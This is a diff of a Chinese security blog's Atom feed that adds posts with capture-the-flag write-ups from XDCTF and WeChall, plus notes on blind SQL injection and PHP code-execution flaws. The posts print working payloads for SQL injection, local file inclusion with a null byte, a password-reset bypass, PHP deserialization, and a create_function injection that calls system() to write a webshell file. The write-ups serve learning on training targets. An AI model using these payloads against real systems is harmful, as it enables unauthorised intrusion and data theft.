@@ -5,7 +5,7 @@
   <subtitle><![CDATA[Blog]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc//"/>
-  <updated>2015-07-22T13:47:45.000Z</updated>
+  <updated>2015-10-14T16:39:38.000Z</updated>
   <id>http://lazysheep.cc//</id>
   
   <author>
@@ -16,11 +16,123 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[网络基础学习之三]]></title>
+    <link href="http://lazysheep.cc/2015/10/05/0x0A/"/>
+    <id>http://lazysheep.cc/2015/10/05/0x0A/</id>
+    <published>2015-10-05T13:30:11.000Z</published>
+    <updated>2015-10-14T16:39:38.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/net.jpg" alt="network"><br><a id="more"></a><br>半年前, 我在博客里写下了 <a href="http://old.lazysheep.cc/2015/01/04/0x01/" target="_blank" rel="external">HOW TO STUDY NETWORK（一）</a> 和 <a href="http://old.lazysheep.cc/2015/01/04/0x02/" target="_blank" rel="external">HOW TO STUDY NETWORK (二)</a><br>如今回首看看, 有许多不足… 现在进行一些补充和总结, 所以有了之三..</p>
+<p>在我看来, 网络是安全的基础, 如果没有网络, 只需要多顾些保安就行了, 还有我们干的事? 哦, 逆向还有活路..</p>
+<p>跟以前不同, 现在我认为网络的学习可以分为三个方向,<br>第一，就是往网络工程师这个方向学习，关于这方面，我认为我的 <code>HOW TO STUDY NETWORK(一)</code> 里已经写的很清楚了，我觉得没啥需要补充的了。。对于这个方向需要达到的能力我觉得很简单，也很难 —&gt; 能按照要求搭建网络环境 &amp;&amp; 拥有故障排查能力。。<br>这个方向不是只要学CCNA就行的，考完CCNA之后就需要靠CCNP，就像标题说的一样，我写的只是基础入门的内容，而入门之后，你自己就会知道之后的道路了。。</p>
+<p>第二，网络协议开发。。。主要是开发应用层的协议（其他层的当然也会有），学网络（socket）编程？由于这方面我接触的少，就先略过。。</p>
+<p>第三，网络安全，有开发自然有安全，这应该是运维工程师学习的方向，</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/net.jpg" alt="network"><br>]]>
+    
+    </summary>
+    
+      <category term="网络" scheme="http://lazysheep.cc/tags/%E7%BD%91%E7%BB%9C/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[不使用select情况下的各种盲注]]></title>
+    <link href="http://lazysheep.cc/2015/10/05/0x09/"/>
+    <id>http://lazysheep.cc/2015/10/05/0x09/</id>
+    <published>2015-10-05T03:17:10.000Z</published>
+    <updated>2015-10-05T10:30:10.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br><a id="more"></a><br>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+<p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
+<p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
+<p>上面的语句用到了两个函数, 一个 <code>if()</code> &amp;&amp; <code>rpad()</code><br>if函数在我之前的博客中写过, 就不再多说..主要讲讲rpad()<br>rpad还有个相同功能的行数lpad, 一个是right 一个是 left , 具体的用法已实例来讲解:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name from table;</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| name     |</span><br><span class="line">+----------+</span></span><br><span class="line"><span class="header">| Hcamael  |</span><br><span class="line">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select rpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| rpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| Hcamael111          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,5,1) from table;</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| rpad(name,5,1)     |</span><br><span class="line">+--------------------+</span></span><br><span class="line"><span class="header">| Hcama              |</span><br><span class="line">+--------------------+</span></span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="header">mysql&gt; select lpad(name,10,1) from table;</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| lpad(name,10,1)     |</span><br><span class="line">+---------------------+</span></span><br><span class="line"><span class="header">| 111Hcamael          |</span><br><span class="line">+---------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>这两个函数有三个参数, 第一个是字段名, 第二个是显示几位, 第三个是当位数不足时, 以啥补充..</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 0x2:</span><br><span class="line">    $i = 111" OR username REGEXP "^[a-z]</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID =<span class="string">"111"</span> <span class="keyword">OR</span> username <span class="keyword">REGEXP</span> <span class="string">"^[a-z]"</span></span><br><span class="line">正则匹配法注入, 真是涨姿势了, 第一次见</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x3</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR (ascii(ord(username,1,1)))=97# 或者 111"</span> <span class="keyword">OR</span> (<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="string">'a'</span>#</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> (<span class="keyword">ascii</span>(<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">97</span>#<span class="string">"</span><br><span class="line">这种方法我以前盲注的时候写过, 可是当没有select的时候, 我却自然的以为这些不行用了...</span></span></span><br></pre></td></tr></table></figure>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br>]]>
+    
+    </summary>
+    
+      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[2015XDCTF低分web题writeup]]></title>
+    <link href="http://lazysheep.cc/2015/10/03/0x08/"/>
+    <id>http://lazysheep.cc/2015/10/03/0x08/</id>
+    <published>2015-10-03T06:11:30.000Z</published>
+    <updated>2015-10-05T03:16:16.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br><a id="more"></a><br>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
+<h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
+<h2 id="web1_200">web1 200</h2><p>这题是大JAVA的题目,  可惜并不会,, 就是有个一个SessionExample界面, 可以进行设置session, (为啥需要这种东西?)<br>然后设置, login=true, user=Administrator</p>
+<h2 id="web2_系列-">web2 系列..</h2><p>P神出的代码审计4连套, PS: P神写的站, 给你代码你也日不动~~<br>只搞定两题..</p>
+<h3 id="web2_200">web2 200</h3><p>第一步是搞到源码, 题目里说了用git管理源码, 所以应该是.git 泄露了… 访问 /.git 403, 果然是….</p>
+<p>去百度后下载了 <code>rip-git.pl</code> ,拖/.git, 拖下来了, 却不能还原源码, 估计有些重要的没拖下来..</p>
+<p>接下来是:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout master</span><br><span class="line"><span class="variable">$ </span>git checkout -f</span><br></pre></td></tr></table></figure></p>
+<p>搞出来了个 <code>README.md</code><br>根据里面的提示, 去网站上搞到了个 /.git/refs/tags/1.0<br>然后把 /.git/refs/heads/master 的hash 值用 /tags/1.0 里的hash替换<br>再 <code>$ git checkout -f</code><br>然后就搞到源码了, 第一个200的flag就在index.php里..</p>
+<h3 id="web2_100">web2 100</h3><p>存在强制修改任意用户密码漏洞, 管理员邮箱在首页: xdsec-cms@xdctf.com<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line"><span class="link_url">http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&amp;verify</span>[<span class="link_label">1</span>]=aa</span><br></pre></td></tr></table></figure></p>
+<p>修改密码后登录, get 100 flag…</p>
+<p>后面就日不动了,,, 毕竟P神…<br>XDCTF的web题质量都挺高的…学到了很多..</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br>]]>
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[WeChall Writeup]]></title>
+    <link href="http://lazysheep.cc/2015/08/07/0x06/"/>
+    <id>http://lazysheep.cc/2015/08/07/0x06/</id>
+    <published>2015-08-07T09:01:53.000Z</published>
+    <updated>2015-10-15T01:08:56.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br><a id="more"></a></p>
+<p>年轻人, 要多撸题, 少打炮..</p>
+<h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
+<h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
+<h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
+<h2 id="0x03_Training:_Register_Globals">0x03 Training: Register Globals</h2><p>全局变量的问题,,上次看到过,,不过现在的php已经没这漏洞了…(PHP还是那么老版本的活该..)<br>payload: <code>globals.php?login[]=admin</code></p>
+<h2 id="0x04_Are_you_serial">0x04 Are you serial</h2><p>这个有点屌…放代码吧..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoloader</span><span class="params">(<span class="variable">$classname</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">'./'</span>.str_replace(<span class="string">'.'</span>, <span class="string">''</span>, <span class="variable">$classname</span>).<span class="string">'.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cece</span><span class="params">(<span class="variable">$name</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'cece'</span>);</span><br><span class="line"> <span class="comment">#spl_autoload_register('my_autoloader');</span></span><br><span class="line"><span class="variable">$user</span> = unserialize(<span class="string">'O:7:"phpinfo":0:&#123;&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这题的重点就在于 <code>spl_autoload_register</code> 这个函数.<br>解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到 (<code>sql_autoload_register(xxx)</code>) xxx函数中.<br>这题只要能运行 <code>SERIAL_Solution.php</code> 这个文件就算成功</p>
+<p>所以最后的payload是改cookie,<br><code>serial_user</code> 的值为 <code>O:15:&quot;SERIAL_Solution&quot;:0:{}</code></p>
+<h2 id="0x05_PHP_0819">0x05 PHP 0819</h2><p>第一次知道php还有这鬼东西….heredoc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;suibian</span><br><span class="line">正文</span><br><span class="line">正文</span><br><span class="line">suibian;</span></span><br><span class="line"><span class="comment">// 格式应该是 &lt;&lt;&lt;+任意字符x+换行+字符串+换行+任意字符x+;</span></span><br></pre></td></tr></table></figure>
+<p>这题的目的 <code>eval(&quot;\$spaceone=&#39;1337&#39;;&quot;);</code><br>但是引号都被过滤了…所以就可以用上面的那个代替引号…这里由于<code>eval</code>的原因, 结尾还要再来一个换行<br>payload: <code>index.php?eval=&lt;&lt;&lt;r%0a1337%0ar;%0a</code></p>
+<h2 id="0x06_HOST_me">0x06 HOST me</h2><p>这题一看就知道是去改host, 不过比较坑….改成 <code>host:localhost</code> 后会报错…纠结了好久..<br>网上查了以下才知道…需要….<br>payload:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只把要修改的行列出来</span></span><br><span class="line">GET <span class="string">http:</span><span class="comment">//www.wechall.net/challenge/space/host_me/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> localhost</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07_PHP_0815">0x07 PHP 0815</h2><p>这题有点屌…这题的大概意思是它给你的代码存在sqli, 然后让你给出修补的方案, 要给出最短, 还不会影响原程序的方案…<br>表示并不会, 只看出了应该是修改 <code>in_array</code> 这里..<br>到网上搜索后才知道, 需要把 <code>$show</code> 转换为int 型, 有 <code>int()</code> 和 <code>intval()</code> 然而答案要最短,<br>最短的黑魔法…. —&gt; <code>$show - 0</code><br>提交 <code>in_array($show-0, $whitelist)</code> 竟然不对…坑爹的…最后提交 <code>-0</code> 过了..</p>
+<p>最后, 我在想,, 这脚本有sqli? 怎么日? ….然后试了一下…果然有…<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code.php?show=1%20union%20select%201%23</span></span><br><span class="line">Query: SELECT <span class="number">1</span> FROM `table` WHERE `id`=<span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br><span class="line">SHOWING NUMBER <span class="number">1</span> union select <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<!--## 0x08 Stop us-->
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br>]]>
+    
+    </summary>
+    
+      <category term="Wechall" scheme="http://lazysheep.cc/tags/Wechall/"/>
+    
+      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[git小记]]></title>
     <link href="http://lazysheep.cc/2015/07/22/0x04/"/>
     <id>http://lazysheep.cc/2015/07/22/0x04/</id>
     <published>2015-07-22T12:30:25.000Z</published>
-    <updated>2015-07-22T13:47:45.000Z</updated>
+    <updated>2015-10-05T03:16:25.000Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br><a id="more"></a></p>
 <p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
 <p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
@@ -71,12 +183,18 @@
     <link href="http://lazysheep.cc/2015/07/21/0x03/"/>
     <id>http://lazysheep.cc/2015/07/21/0x03/</id>
     <published>2015-07-21T15:01:39.000Z</published>
-    <updated>2015-07-21T16:13:31.000Z</updated>
+    <updated>2015-09-28T05:39:27.000Z</updated>
     <content type="html"><![CDATA[<p><img src="/img/php.jpg" alt="php"><br><a id="more"></a><br>代码部分来自 <a href="https://code.google.com/p/pasc2at/wiki/SimplifiedChinese" target="_blank" rel="external">https://code.google.com/p/pasc2at/wiki/SimplifiedChinese</a></p>
 <h2 id="0x00_这种，现在应该没人会这么写吧？">0x00 这种，现在应该没人会这么写吧？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">//key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span></span><br><span class="line"><span class="comment">//print_R($_GET); </span></span><br><span class="line"> <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="0x01_变量覆盖，并不懂为啥有人会这么写">0x01 变量覆盖，并不懂为啥有人会这么写</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="comment">//var.php?a=fuck      </span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">'hi'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;    <span class="comment">//输出fuck</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="0x02_同样也是变量覆盖。。">0x02 同样也是变量覆盖。。</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var.php?var=new</span></span><br><span class="line"><span class="variable">$var</span> = <span class="string">'init'</span>;                     </span><br><span class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>]);  <span class="comment">//$_SERVER['QUERY_STRING']的值为get参数</span></span><br><span class="line"><span class="comment">//parse_str(string,array) 设置变量的函数，array没设置就会覆盖已存在的变量</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$var</span>;</span><br></pre></td></tr></table></figure>
-<h2 id="0x03">0x03</h2>]]></content>
+<h2 id="0x03_代码执行漏洞">0x03 代码执行漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//how to exp this code</span></span><br><span class="line"><span class="variable">$sort_by</span>=<span class="variable">$_GET</span>[<span class="string">'sort_by'</span>];</span><br><span class="line"><span class="variable">$sorter</span>=<span class="string">'strnatcasecmp'</span>;</span><br><span class="line"><span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">'test'</span>,<span class="string">'test'</span>);</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">'  return 1 * '</span> . <span class="variable">$sorter</span> . <span class="string">'($a["'</span> . <span class="variable">$sort_by</span> . <span class="string">'"], $b["'</span> . <span class="variable">$sort_by</span> . <span class="string">'"]); '</span>;</span><br><span class="line">usort(<span class="variable">$databases</span>, create_function(<span class="string">'$a, $b'</span>, <span class="variable">$sort_function</span>));</span><br></pre></td></tr></table></figure>
+<p>这个我研究了下, 有点屌啊~~</p>
+<p>首先, 漏洞永远在于用户的可控点上, 所以上面的代码漏洞只可能存在于 <code>$sort_function = &#39;  return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]); &#39;;</code> 之中</p>
+<p>payload:<br><code>sort_by=1&quot;],$b[&quot;2&quot;]) * system(&quot;echo &#39;&lt;?php phpinfo(); &#39; &gt; a.php &quot;);//</code></p>
+<p>只要权限够, 就能写入一句话, 然后get webshell..</p>
+<p>类似的函数还有:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">assert</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">call_user_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">call_user_func_array</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">create_function</span><span class="params">()</span></span></span><br><span class="line">变量函数</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+]]></content>
     <summary type="html">
     <![CDATA[<p><img src="/img/php.jpg" alt="php"><br>]]>
     
